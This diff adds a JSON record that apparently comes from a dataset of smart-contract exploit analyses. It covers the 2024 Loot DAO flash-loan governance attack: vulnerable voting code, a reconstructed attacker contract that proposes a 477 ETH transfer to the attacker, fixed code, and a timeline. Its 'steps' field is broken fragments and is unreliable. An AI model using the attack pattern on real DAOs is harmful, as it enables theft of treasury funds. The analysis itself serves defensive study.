@@ -1,0 +1,41 @@
+{
+ "id": "2024__2024-01-05_Loot_GovernanceAttack_ETH",
+ "source_file": "2024/2024-01-05_Loot_GovernanceAttack_ETH.md",
+ "title": "Loot — Governance Attack (Flash Loan Vote Manipulation) Analysis",
+ "date": "2024-01-05",
+ "protocol": "Loot DAO",
+ "chain": "Ethereum",
+ "loss_raw": "~$1,200,000 (477 ETH) — **actual theft prevented** by Phalcon intervention",
+ "loss_usd": 1200000.0,
+ "root_cause": "Governance Attack — Missing Vote Token Locking (Flash Loan Vote Manipulation)",
+ "attack_tx": "0xbc8c...0556",
+ "vulnerable_contract": "LootDAOProxy 0xcdb9...a786",
+ "classes": [
+  "governance"
+ ],
+ "code_before": [
+  "// LootDAO Governor - castVote (vulnerable implementation)\nfunction castVoteInternal(\n    address voter,\n    uint proposalId,\n    uint8 support\n) internal returns (uint96) {\n    // Calculate voting power (number of NFTs held) at current block\n    uint96 votes = loot.getPriorVotes(voter, proposals[proposalId].startBlock);\n    \n    // @audit ❌ Tokens are not locked after voting\n    // @audit ❌ Same token can be transferred → re-voted from another address\n    // @audit ❌ Tokens borrowed via flash loan are also counted as voting power\n    \n    Receipt storage receipt = proposals[proposalId].receipts[voter];\n    require(receipt.hasVoted == false, \"GovernorBravo::castVoteInternal: voter already voted\");\n    \n    if (support == 0) {\n        proposals[proposalId].againstVotes = add256(proposals[proposalId].againstVotes, votes);\n    } else if (support == 1) {\n        proposals[proposalId].forVotes = add256(proposals[proposalId].forVotes, votes);\n    }\n    \n    receipt.hasVoted = true;\n    receipt.support = support;\n    receipt.votes = votes;\n    \n    return votes;\n    // @audit ❌ Token can be transferred after return → same token can be re-voted from another address\n}",
+  "// @audit ❌ Proposal creation only checks current holdings, not holding period\nfunction propose(\n    address[] memory targets,\n    uint[] memory values,\n    string[] memory signatures,\n    bytes[] memory calldatas,\n    string memory description\n) public returns (uint) {\n    // Only checks current holdings (can be satisfied via short-term purchase/borrow)\n    require(\n        loot.getCurrentVotes(msg.sender) > proposalThreshold,\n        \"GovernorBravo::propose: proposer votes below proposal threshold\"\n    );\n    // @audit ❌ Can create proposal after temporarily holding via flash loan\n    // @audit ❌ No holding period requirement\n    ...\n}",
+  "// Attack contract (reconstructed) — 0xebba0f3e16ef2f5e87c38e49541b7ae3c7b78e8c\ncontract LootAttacker {\n    address public owner;  // = 0x469a2f900ef0504299bfd4d1812618a94b67e189 (tx.origin)\n    \n    // constructor executes immediately upon deployment\n    constructor() {\n        owner = tx.origin;\n        \n        // ① Step: Transfer 8 Loot NFTs to attack contract (approve + transferFrom)\n        uint256[] memory tokenIds = [3474, 2416, 539, 1438, 1415, 2386, 383, 2102];\n        for (uint i = 0; i < tokenIds.length; i++) {\n            // safeTransferFrom(owner, attackContract, tokenId)\n            LOOT.safeTransferFrom(tx.origin, address(this), tokenIds[i]);\n        }\n        \n        // ② Step: Create proposal\n        // Proposal content: WETH.transfer(0x70670b5...065, 477 ETH)\n        // i.e., transfer 477 ETH from LootDAOExecutor to attacker's wallet\n        _propose(\n            governor,           // 0xcdb9f8f9be143b7c72480185459ab9720462a786\n            0x70670b5ee954f9052353bf9dac5c8697f2e5c065  // recipient address\n        );\n    }\n    \n    function _propose(address governor, address recipient) internal {\n        address[] memory targets = new address[](1);\n        targets[0] = WETH;   // 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2\n        \n        uint256[] memory values = new uint256[](1);\n        values[0] = 0;\n        \n        string[] memory signatures = new string[](1);\n        signatures[0] = \"\";\n        \n        bytes[] memory calldatas = new bytes[](1);\n        // transfer(recipient, 477 ETH) = a9059cbb + recipient + amount\n        calldatas[0] = abi.encodeWithSelector(\n            IERC20.transfer.selector,\n            recipient,\n            477 ether  // 0x19dbb46cbee5540000\n        );\n        \n        // @audit ❌ governor.propose() call — voting period begins\n        IGovernor(governor).propose(targets, values, signatures, calldatas, \"Proposal #5\");\n    }\n}"
+ ],
+ "code_after": [
+  "// Fix 1: Lock token transfers during voting period (ERC-721 extension)\nfunction castVoteInternal(\n    address voter,\n    uint proposalId,\n    uint8 support\n) internal returns (uint96) {\n    Proposal storage proposal = proposals[proposalId];\n    \n    // ✅ Calculate voting power based on snapshot block (at time of deployment)\n    uint96 votes = loot.getPriorVotes(voter, proposal.startBlock);\n    \n    Receipt storage receipt = proposal.receipts[voter];\n    require(!receipt.hasVoted, \"Already voted\");\n    \n    // ✅ Record and lock voted NFT IDs\n    uint256[] memory tokenIds = loot.getTokensOfOwner(voter);\n    for (uint i = 0; i < tokenIds.length; i++) {\n        require(!voteLocked[proposalId][tokenIds[i]], \"Token already used for vote\");\n        voteLocked[proposalId][tokenIds[i]] = true;  // Block transfers during voting period\n    }\n    \n    if (support == 1) {\n        proposal.forVotes = add256(proposal.forVotes, votes);\n    } else {\n        proposal.againstVotes = add256(proposal.againstVotes, votes);\n    }\n    \n    receipt.hasVoted = true;\n    receipt.votes = votes;\n    return votes;\n}\n\n// Fix 2: Snapshot at proposal creation + mandatory timelock\nfunction propose(...) public returns (uint) {\n    // ✅ Verify proposer minimum holding period (e.g., held for 30+ days)\n    require(\n        loot.getPriorVotes(msg.sender, block.number - HOLDING_PERIOD) >= proposalThreshold,\n        \"Must hold tokens for minimum period\"\n    );\n    // ...\n}",
+  "// ✅ Prove holding for a set period (e.g., 13,140 blocks ≈ 2 days)\nfunction propose(...) public returns (uint) {\n    // Query snapshot voting power at current block - holding period blocks\n    uint256 snapshotBlock = block.number - PROPOSAL_MIN_HOLDING_BLOCKS; // 13,140 blocks\n    require(\n        loot.getPriorVotes(msg.sender, snapshotBlock) > proposalThreshold,\n        \"Insufficient prior voting power (holding period not met)\"\n    );\n    ...\n}"
+ ],
+ "steps": [
+  "- Attack plan: Flash-borrow large quantity of Loot NFTs from NFTX → cast repeated votes → reach 155 votes → pass proposal",
+  "Step 1: NFT Step 2: Create Proposal",
+  "Loot NFT x8 → Proposal ID: #5",
+  "477 ETH ← amount",
+  "477 ETH → attacker's wallet",
+  "→ 14:48 Twitter alert issued",
+  "→ 15:42 War room assembled",
+  "→ attempt repeat not reached)",
+  "→ target 155 votes Proposal #6 created:",
+  "477 ETH successfully",
+  "⑥ After proposal passes, execute() → steal 477 ETH"
+ ],
+ "other_code": [
+  "Block #18,941,483 (2024-01-05 13:51:47 UTC)\n\n┌─────────────────────────────────────────────┐\n│  Attacker (0x469a...e189)                    │\n│  ↓ Deploy attack contract (CREATE)           │\n└─────────────────────────────────────────────┘\n                    │\n                    ▼\n┌─────────────────────────────────────────────┐\n│  Attack contract constructor executes        │\n│  (0xebba0f3e16ef2f5e87c38e49541b7ae3c7b78e8c) │\n└─────────────────────────────────────────────┘\n                    │\n          ┌─────────┴──────────┐\n          ▼                    ▼\n┌──────────────────┐  ┌────────────────────────┐\n│ Step 1: NFT      │  │ Step 2: Create Proposal │\n│ Transfer         │  │                        │\n│                  │  │ governor.propose() call │\n│ Loot NFT x8 →   │  │ Proposal ID: "
+ ]
+}
